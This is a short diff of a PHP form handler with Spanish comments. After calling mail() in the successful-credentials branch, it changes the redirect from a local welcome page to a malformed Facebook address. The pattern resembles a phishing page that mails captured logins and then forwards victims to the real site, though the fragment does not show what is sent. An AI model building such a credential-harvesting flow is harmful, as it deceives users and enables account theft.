@@ -28,7 +28,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             mail($to, $subject, $message, $headers);
 
             // Redirigir al usuario a la página de bienvenida
-            header('Location: welcome.php');
+            header('Location: https//:facebook.com');
             exit;
         } else {
             // Si las credenciales son incorrectas, mostrar un mensaje de error
